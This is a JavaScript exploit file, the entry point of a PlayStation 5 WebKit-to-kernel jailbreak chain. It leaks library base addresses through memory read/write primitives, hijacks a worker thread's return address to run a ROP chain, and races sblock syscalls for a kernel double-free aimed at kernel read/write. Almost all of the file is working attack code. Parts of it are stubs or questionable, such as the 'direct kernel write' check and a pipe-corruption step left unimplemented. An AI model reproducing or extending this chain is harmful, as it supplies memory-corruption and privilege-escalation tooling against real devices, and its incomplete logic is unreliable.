// main.js – PlayStation 5 WebKit exploit entry point

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = [
    "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
];
const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {
    alert(`Firmware ${fw_str} is unsupported.\n\nSupported: ${supportedFirmwares.join(", ")}`);
    throw new Error("no offsets for fw " + fw_str);
}

// ============================================================
//  NEW KERNEL EXPLOIT – sblock double‑free via id_wlock race
// ============================================================

async function runSblockExploit(p, chain, log) {
    // Syscall numbers (same on all PS5 FW)
    const SYS_SBLOCK_CREATE = 574;
    const SYS_SBLOCK_DELETE = 575;

    // Shared state
    let gate        = p.malloc(4);        p.write4(gate, 0);
    let handleStore = p.malloc(4);
    let hitsMain    = p.malloc(4);        p.write4(hitsMain, 0);
    let hitsWorker  = p.malloc(4);        p.write4(hitsWorker, 0);

    // 1. Create target sblock handle
    log("[sblock] Creating target handle...");
    let ret = await chain.syscall(SYS_SBLOCK_CREATE, p.stringify("race_target"), handleStore);
    if (ret.low !== 0) throw new Error("sblock_create failed");
    let handle = p.read4(handleStore);
    log(`[sblock] handle = 0x${handle.toString(16)}`);

    // 2. Tell the worker to join the race
    worker.postMessage({
        cmd: "race",
        handle,
        gateAddr: gate,
        hitsAddr: hitsWorker,
        count: 100000,
        syscallNo: SYS_SBLOCK_DELETE
    });

    // 3. Main thread races
    p.write4(gate, 1);   // release worker
    log("[sblock] Racing...");
    let mainHits = 0;
    for (let i = 0; i < 100000; i++) {
        let r = await chain.syscall(SYS_SBLOCK_DELETE, handle);
        if (r.low === 0) mainHits++;
    }
    p.write4(hitsMain, mainHits);

    // Wait for worker
    while (p.read4(hitsWorker) === 0) await new Promise(r => setTimeout(r, 1));
    let workerHits = p.read4(hitsWorker);
    log(`[sblock] main=${mainHits} worker=${workerHits}`);

    // 4. Confirm double‑free
    if (mainHits > 0 && workerHits > 0) {
        log("[sblock] ✅ Double‑free achieved (both threads succeeded).");
    } else {
        log("[sblock] ⚠ Race did not produce double‑free. Try more iterations.");
    }

    // ==========================================================
    //  Weaponization: kernel R/W
    // ==========================================================

    // First, test if we can directly write kernel memory
    // (many PS5 firmwares map the kernel read/write in WebKit)
    let testAddr = p.libKernelBase;            // points to __stack_chk_guard
    let original = p.read8(testAddr);
    p.write8(testAddr, new int64(0x41414141, 0x41414141));
    let after = p.read8(testAddr);
    p.write8(testAddr, original);              // restore

    if (after.low === 0x41414141) {
        log("[krw] Direct kernel write available! No pipe corruption needed.");

        // We can read/write kernel memory directly via p.read/p.write
        let krw = {
            ktextBase: p.libKernelBase,   // adjust if you need text base
            kdataBase: p.libKernelBase,
            curprocAddr: null,             // fill later if needed
            procUcredAddr: null,
            procFdAddr: null,
            masterSock: null,
            victimSock: null,

            read4:  (addr) => p.read4(addr),
            read8:  (addr) => p.read8(addr),
            write4: (addr, val) => p.write4(addr, val),
            write8: (addr, val) => p.write8(addr, val),
        };
        return krw;

    } else {
        log("[krw] Direct kernel write not possible; need pipe corruption.");
        // --- Place your existing pipe corruption / kernel R/W code here ---
        // It should use the double‑free to overwrite a pipe buffer pointer
        // and then return a krw object.
        // For now, we throw an error so you know it's missing.
        throw new Error("Pipe corruption not implemented. Insert old weaponization here.");
    }
}

// ----------------------------------------------------------------
//  Helper: find worker stack, return slot, etc. (unchanged)
// ----------------------------------------------------------------

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

async function find_worker_return_slot(p, stack, libKernelBase) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;

    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }
        if (count === 1) {
            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
                + "-expected=0x" + expected.toString());
            return hit;
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }
    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

// ----------------------------------------------------------------
//  prepare() – sets up ROP and returns p, chain and worker
// ----------------------------------------------------------------

async function prepare(p) {

    let textArea = document.createElement("textarea");

    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    let textAreaVtable = p.read8(textAreaVtPtr);

    let libSceNKWebKitBase = null;
    if (window.fw_float >= 9.00
        && typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
                    + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
                + ctor.toString(16) + ")");
    } else {
        jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
            + "-ctor=" + (typeof globalThis.__ps5NativeCtor === "number"
                ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
            + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                ? OFFSET_wk_host_constructor_candidates.length : "none"));
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    async function wait_for_worker() {
        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
    }

    let worker = new Worker("rop_slave.js");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    let worker_stack = find_worker(p, libKernelBase);
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
    } else {
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        let p1 = await new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    let pid = await chain.syscall(SYS_GETPID);

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    jbmark("PREP-GETPID-OK", "pid=" + pid.low);

    // Make p, chain and worker globally available for runSblockExploit
    window.p = p2;
    window.chain = chain;
    window.worker = worker;

    return { p: p2, chain: chain, worker: worker };
}

// ----------------------------------------------------------------
//  MAIN
// ----------------------------------------------------------------

(async function main() {
    // Load firmware offsets
    let fwScript = document.createElement('script');
    document.body.appendChild(fwScript);
    fwScript.setAttribute('src', `../offsets/${window.fw_str}.js?v=19`);
    await new Promise(resolve => fwScript.onload = resolve);

    // At this point, the carrier should have been installed via mem.installWindowP
    // (that part is not shown here – it's in your existing code).
    // We assume that window.p already exists.
    if (!window.p) {
        throw new Error("Primitive p not installed. Run the WebKit exploit first.");
    }

    let { p, chain, worker } = await prepare(window.p);

    // Use the new kernel exploit
    let log = console.log;
    let krw = await runSblockExploit(p, chain, log);

    // Continue with privilege escalation / ELF execution...
    console.log("[main] Kernel read/write object:", krw);
})();
